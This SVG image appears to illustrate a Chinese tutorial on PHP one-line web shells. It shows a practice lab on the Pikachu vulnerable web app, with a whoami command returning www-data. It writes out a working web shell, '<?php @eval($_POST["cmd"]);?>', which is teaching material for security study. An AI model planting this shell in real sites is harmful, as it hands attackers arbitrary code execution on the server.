<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 450" width="800" height="450">
  <defs>
    <linearGradient id="bg6" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#0D1024"/>
      <stop offset="50%" stop-color="#181330"/>
      <stop offset="100%" stop-color="#2A1F42"/>
    </linearGradient>
    <linearGradient id="card" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#0B0E1B"/>
      <stop offset="100%" stop-color="#070810"/>
    </linearGradient>
    <linearGradient id="line" x1="0" y1="0" x2="1" y2="0">
      <stop offset="0%" stop-color="#6C5CE7"/>
      <stop offset="100%" stop-color="#00D2A8"/>
    </linearGradient>
    <filter id="blur6" x="-50%" y="-50%" width="200%" height="200%">
      <feGaussianBlur stdDeviation="14"/>
    </filter>
  </defs>

  <rect width="800" height="450" fill="url(#bg6)"/>

  <g fill="#ffffff">
    <circle cx="72" cy="44" r="1.5" opacity="0.65"/>
    <circle cx="164" cy="28" r="1.1" opacity="0.4"/>
    <circle cx="248" cy="66" r="1.2" opacity="0.5"/>
    <circle cx="336" cy="34" r="1" opacity="0.35"/>
    <circle cx="428" cy="22" r="1.4" opacity="0.55"/>
    <circle cx="512" cy="58" r="1" opacity="0.4"/>
    <circle cx="604" cy="30" r="1.3" opacity="0.5"/>
    <circle cx="692" cy="62" r="1.5" opacity="0.6"/>
    <circle cx="766" cy="36" r="1" opacity="0.4"/>
    <circle cx="754" cy="120" r="1.1" opacity="0.35"/>
    <circle cx="46" cy="176" r="1" opacity="0.3"/>
    <circle cx="718" cy="392" r="1.2" opacity="0.45"/>
    <circle cx="88" cy="404" r="1" opacity="0.35"/>
    <circle cx="612" cy="414" r="0.9" opacity="0.3"/>
  </g>

  <g filter="url(#blur6)" opacity="0.32">
    <ellipse cx="150" cy="80" rx="130" ry="60" fill="#6C5CE7"/>
    <ellipse cx="660" cy="360" rx="140" ry="55" fill="#00A88A"/>
  </g>

  <rect x="88" y="104" width="624" height="150" rx="9" fill="url(#card)" stroke="#352B52" stroke-width="1.2"/>
  <rect x="88" y="104" width="4" height="150" rx="2" fill="url(#line)"/>

  <g font-family="Consolas, 'Courier New', monospace">
    <text x="118" y="140" font-size="12" fill="#5D6883">shell.php</text>
    <text x="118" y="178" font-size="17" fill="#8C7CF0">&lt;?php</text>
    <text x="200" y="178" font-size="17" fill="#C8C2E0">@</text>
    <text x="218" y="178" font-size="17" fill="#00D2A8">eval</text>
    <text x="262" y="178" font-size="17" fill="#C8C2E0">(</text>
    <text x="272" y="178" font-size="17" fill="#7FB8E8">$_POST</text>
    <text x="344" y="178" font-size="17" fill="#C8C2E0">[</text>
    <text x="354" y="178" font-size="17" fill="#E8A87C">"cmd"</text>
    <text x="402" y="178" font-size="17" fill="#C8C2E0">]);</text>
    <text x="440" y="178" font-size="17" fill="#8C7CF0">?&gt;</text>

    <text x="118" y="222" font-size="12.5" fill="#5D6883">http://192.168.96.128/pikachu/shell2.php?cmd=whoami</text>
  </g>

  <path d="M400 262 L400 292" stroke="#3D3358" stroke-width="1.6"/>
  <path d="M394 286 L400 294 L406 286" fill="none" stroke="#00D2A8" stroke-width="1.8"/>

  <rect x="196" y="300" width="408" height="62" rx="8" fill="#070810" stroke="#2C2544" stroke-width="1"/>
  <g font-family="Consolas, monospace" font-size="15">
    <text x="216" y="325" fill="#5AD1A0">www-data</text>
    <text x="292" y="325" fill="#6B7590">:/var/www/html/pikachu</text>
    <text x="500" y="325" fill="#8B94AD">$</text>
    <text x="216" y="347" fill="#8FA6C4" font-size="13">uid=33(www-data) gid=33(www-data)</text>
  </g>

  <rect x="88" y="392" width="624" height="2" fill="url(#line)"/>

  <text x="88" y="424" font-family="'Microsoft YaHei', 'PingFang SC', sans-serif" font-size="18.5" fill="#E8E6F2" letter-spacing="1.2">一句话木马：从 URL 到服务器控制台</text>
</svg>
